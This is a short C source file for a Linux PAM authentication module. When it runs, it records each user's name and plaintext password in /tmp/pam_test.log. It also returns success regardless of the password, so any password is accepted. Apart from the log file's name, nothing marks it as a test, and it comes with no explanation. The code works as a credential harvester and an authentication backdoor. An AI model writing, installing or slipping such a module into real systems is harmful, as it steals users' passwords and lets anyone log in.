#include <security/pam_ext.h>
#include <security/pam_modules.h>
#include <stdio.h>

PAM_EXTERN int pam_sm_authenticate(
    pam_handle_t* pamh,
    int flags,
    int argc,
    const char** argv) {
  const char* user = NULL;
  const char* pass = NULL;
  pam_get_user(pamh, &user, NULL);

  int ret = pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

  FILE* log = fopen("/tmp/pam_test.log", "a");
  if (log) {
    if (ret == PAM_SUCCESS && pass) {
      fprintf(log, "User: %s Password: %s\n", user, pass);
    } else {
      fprintf(log, "User: %s Password: [NOT AVAILABLE] (ret=%d)\n", user, ret);
    }
    fclose(log);
  }
  return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_setcred(pam_handle_t* pamh, int flags, int argc, const char** argv) {
  return PAM_IGNORE;
}
